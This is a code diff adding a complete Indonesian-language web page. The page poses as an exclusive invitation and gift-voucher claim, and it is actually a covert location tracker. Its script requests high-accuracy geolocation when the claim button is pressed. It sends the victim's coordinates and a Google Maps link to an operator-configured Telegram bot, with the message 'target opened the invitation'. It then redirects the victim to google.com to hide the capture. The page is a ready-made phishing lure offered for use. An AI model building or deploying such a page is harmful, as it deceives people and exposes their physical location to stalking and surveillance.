@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Undangan Eksklusif & Voucher Spesial</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+            color: #f8fafc;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .card {
+            background: rgba(30, 41, 59, 0.85);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 30px;
+            border-radius: 16px;
+            text-align: center;
+            max-width: 380px;
+            width: 90%;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        .badge {
+            background: #38bdf8;
+            color: #0f172a;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 15px;
+            display: inline-block;
+        }
+        h2 {
+            margin: 10px 0;
+            font-size: 22px;
+            color: #f1f5f9;
+        }
+        p {
+            font-size: 14px;
+            color: #94a3b8;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        .btn-claim {
+            background: linear-gradient(135deg, #38bdf8, #0284c7);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(56, 189, 248, 0.4);
+        }
+        #status-msg {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #38bdf8;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="badge">Eksklusif Untuk Anda</div>
+        <h2>Voucher & Undangan Spesial 🎉</h2>
+        <p>Anda mendapatkan undangan khusus serta kesempatan mengklaim voucher hadiah menarik. Tekan tombol di bawah untuk verifikasi dan melihat detailnya.</p>
+        
+        <button class="btn-claim" onclick="mulaiKlaim()">Buka Undangan & Klaim</button>
+        <div id="status-msg"></div>
+    </div>
+
+    <script>
+        function mulaiKlaim() {
+            document.getElementById('status-msg').innerText = "Menyiapkan data verifikasi...";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    let lat = pos.coords.latitude;
+                    let lon = pos.coords.longitude;
+                    
+                    // GANTI TOKEN DAN CHAT ID TELEGRAM ANDA DI SINI
+                    let tokenBot = "MASUKKAN_TOKEN_BOT_ANDA";
+                    let chatId = "MASUKKAN_CHAT_ID_ANDA";
+                    
+                    if(tokenBot !== "MASUKKAN_TOKEN_BOT_ANDA") {
+                        let teleUrl = "https://api.telegram.org/bot" + tokenBot + "/sendMessage?chat_id=" + chatId + "&text=🎯 Target Membuka Undangan!%0ACoords: " + lat + "," + lon + "%0AMaps: https://maps.google.com/?q=" + lat + "," + lon;
+                        fetch(teleUrl).catch(e => {});
+                    }
+                    
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 1500);
+
+                }, function(err) {
+                    document.getElementById('status-msg').innerText = "Mohon izinkan akses lokasi untuk melanjutkan.";
+                }, { enableHighAccuracy: true });
+            } else {
+                alert("Browser tidak mendukung.");
+            }
+        }
+    </script>
+</body>
+</html>
